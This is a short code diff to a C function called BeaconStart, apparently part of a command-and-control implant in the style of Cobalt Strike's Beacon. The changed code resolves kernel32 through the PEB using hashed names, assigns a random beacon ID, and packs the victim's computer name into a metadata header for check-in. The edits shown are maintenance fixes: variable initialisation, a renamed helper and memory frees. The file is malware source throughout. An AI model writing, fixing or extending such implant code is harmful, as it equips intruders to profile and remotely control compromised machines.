@@ -24,9 +24,9 @@
 -*/
 DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 {
-	BEACON_INSTANCE Ins = { 0 };
-	UCHAR           Str[MAX_PATH];
-	PVOID           Ptr;
+	BEACON_INSTANCE Ins           = { 0 };
+	UCHAR           Str[MAX_PATH] = { 0 };
+	PVOID           Ptr           =   0;
 
 	if ((Ptr = PebGetModule( H_KERNEL32 )) != NULL) 
 	{
@@ -140,12 +140,12 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 				{
 					if ((Ins.BeaconId = RandomNumber32( &Ins )) != 0)
 					{
-						PBEACON_METADATA_HDR Met;
-						PVOID                Cmp;
-						PVOID                Usr;
-						PVOID                Prc;
+						PBEACON_METADATA_HDR Met = 0;
+						PVOID                Cmp = 0;
+						PVOID                Usr = 0;
+						PVOID                Prc = 0;
 
-						if ((Cmp = InfoGetComputer( &Ins )))
+						if ((Cmp = BeaconComputer( &Ins )))
 						{
 							Met = BufferCreate( &Ins, sizeof( BEACON_METADATA_HDR ) );
 							Met = BufferAddRaw( &Ins, Met, Str, 16 );
@@ -164,6 +164,9 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 							Met = BufferAddUI4( &Ins, Met, 0x0 );
 							Met = BufferAddRaw( &Ins, Met, Cmp, strlen(Cmp) );
 							Met = BufferAddUI1( &Ins, Met, '\t' );
+
+							Ins.api.LocalFree( Cmp );
+							Ins.api.LocalFree( Met );
 						};
 					};
 				};
